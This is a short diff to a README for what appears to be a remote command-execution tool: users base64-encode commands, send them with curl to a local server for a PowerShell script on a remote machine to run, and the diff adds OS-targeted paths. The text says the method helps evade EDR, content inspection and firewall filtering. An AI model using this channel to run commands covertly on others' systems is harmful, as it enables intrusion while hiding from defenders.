@@ -35,7 +35,7 @@ This approach helps evade EDR, content inspection, and firewall filtering.
 3. In a separate terminal, base64-encode the command you want the remote machine to execute.
    Important: Your command MUST end with a newline (`\n`) so the PowerShell script knows when to execute it.
 
-   Example (to create a folder on the remote system):
+    Example (to create a folder on the remote system):
 
     echo -en 'mkdir C:\\windows\\temp\\test\n' | base64
     bWtkaXIgQzpcd2luZG93c1x0ZW1wXHRlc3QK
@@ -43,6 +43,10 @@ This approach helps evade EDR, content inspection, and firewall filtering.
 4. Send the encoded command using curl:
 
     curl http://127.0.0.1:8000/cmd/bWtkaXIgQzpcd2luZG93c1x0ZW1wXHRlc3QK
+
+    Target a specific OS by appending win, lin, or mac to the /cmd/ path:
+    
+    curl http://127.0.0.1:8000/cmd/lin/bWtkaXIgQzpcd2luZG93c1x0ZW1wXHRlc3QK
 
 5. View the response log:
 
